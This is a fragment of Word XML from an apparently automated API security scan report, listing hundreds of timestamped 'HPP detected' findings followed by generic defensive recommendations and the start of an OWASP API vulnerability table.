        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.938160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1061. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.941385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1062. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.944568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1063. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.947568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1064. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.950771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1065. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.954506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1066. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.957176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1067. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.960425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1068. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.964257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1069. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.967453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1070. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.970655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1071. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.973333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1072. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.975466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1073. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.977050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1074. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.978635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1075. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.980738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1076. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.982331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1077. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.984826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1078. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.986385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1079. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.988741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1080. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.990363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1081. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.992483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1082. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.994231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1083. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.996426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1084. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.998644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1085. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:04.000621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1086. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:04.002214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1087. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:04.004332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1088. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:04.006463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1089. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.849848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1090. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.854361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1091. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.857576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1092. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.860830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1093. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.863743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1094. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.866980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1095. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.870278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1096. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.873493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1097. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.876709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1098. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.879907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1099. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.883121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1100. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.885868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1101. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.888582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1102. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.892357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1103. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.895565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1104. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.897698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1105. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.899936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1106. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.902040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1107. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.904154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1108. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.905760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1109. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.907896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1110. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.909505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1111. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.911122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1112. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.913237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1113. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.914866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1114. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.917008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1115. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.918597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1116. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.920741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1117. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.922863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1118. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.924953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1119. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.926535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1120. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:35:11.928688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1121. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.013789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1122. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.018135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1123. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.021351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1124. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.024065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1125. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.027296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1126. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.030000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1127. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.032670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1128. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.035885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1129. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.038602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1130. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.042353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1131. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.045598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1132. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.048830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1133. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.051484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1134. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.054723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1135. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.058478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1136. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.060625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1137. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.062790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1138. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.064393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1139. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.066553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1140. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.068171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1141. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.070946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1142. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.072560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1143. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.075278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1144. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.077466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1145. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.080176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1146. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.082316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1147. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.084427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1148. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.086590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1149. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.089358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1150. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.091510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1151. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.093729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1152. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:38:19.095896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1153. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.767437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1154. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.772198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1155. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.774834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1156. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.778660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1157. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.781884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1158. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.785120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1159. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.788346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1160. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.791556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1161. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.795321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1162. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.799593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1163. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.802795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1164. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.805989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1165. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.809783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1166. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.813536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1167. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.816758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1168. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.818893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1169. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.821010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1170. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.823141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1171. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.824789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1172. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.826935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1173. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.829100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1174. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.830736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1175. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.832892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1176. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.835012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1177. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.837149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1178. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.838743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1179. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.840394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1180. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.842526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1181. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.844663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1182. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.847888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1183. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.850628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1184. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:41:24.852763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1185. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.185799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1186. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.190757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1187. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.194226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1188. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.197647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1189. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.201928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1190. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.204587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1191. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.207783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1192. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.211049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1193. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.213738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1194. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.217430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1195. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.220649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1196. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.223847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1197. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.227113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1198. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.230323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1199. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.232978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1200. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.235203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1201. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.236798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1202. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.238938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1203. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.241099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1204. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.243245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1205. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.244858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1206. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.246993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1207. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.249114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1208. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.251315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1209. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.253449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1210. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.255035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1211. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.257657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1212. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.259231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1213. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.261357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1214. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.262956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1215. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.265061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1216. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:44:30.266713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1217. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.537751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1218. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.541510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1219. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.545420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1220. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.548160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1221. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.551992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1222. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.554685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1223. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.557381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1224. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.560611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1225. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.563797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1226. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.567005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1227. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.569693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1228. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.571826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1229. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.574090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1230. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.576778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1231. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.579455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1232. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.583189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1233. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.584763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1234. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.586932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1235. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.588531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1236. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.590750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1237. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.592387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1238. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.594576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1239. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.596194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1240. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.597776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1241. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.599702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1242. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.601718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1243. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.603342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1244. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.605430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1245. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.607986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1246. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.609599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1247. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.611713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1248. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:47:37.613310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1249. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.227190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1250. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.235769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1251. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.242503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1252. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.247596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1253. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.254749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1254. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.260534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1255. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.265996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1256. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.270323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1257. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.276520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1258. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.280838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1259. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.285731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1260. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.292112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1261. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.297450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1262. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.303382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1263. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.308470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1264. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.311211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1265. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.314377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1266. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.317787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1267. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.321569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1268. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.324352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1269. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.327028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1270. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.331143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1271. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.335587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1272. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.338539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1273. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.341763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1274. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.345559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1275. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.348825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1276. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.352949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1277. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.356425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1278. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.359966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1279. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.363062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1280. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:50:44.366693</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="utf-8"/&gt;&lt;link rel="icon" href="/favicon.ico"/&gt;&lt;meta name="viewport" content="width=device-width,initial-scale=1"/&gt;&lt;meta name="theme-color" content="</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Recommendations</w:t>
        <w:br/>
        <w:t>1. Validate all input properly.</w:t>
        <w:br/>
        <w:t>2. Use access controls and minimize sensitive exposure.</w:t>
        <w:br/>
        <w:t>3. Enable rate limiting where applicable.</w:t>
        <w:br/>
        <w:t>4. Disable unused endpoints and introspection features.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Validate &amp; sanitize all data from third-party APIs</w:t>
        <w:br/>
        <w:t>- Set time limits &amp; retries</w:t>
        <w:br/>
        <w:t>- Fail safely: handle external errors gracefully</w:t>
        <w:br/>
        <w:t>- Keep third-party credentials secret &amp; rotate regularly</w:t>
        <w:br/>
        <w:t>- Continuously monitor external service behavior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Vulnerabilities Found</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>BOLA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>API1:2023 – Broken Object Level Authorization</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
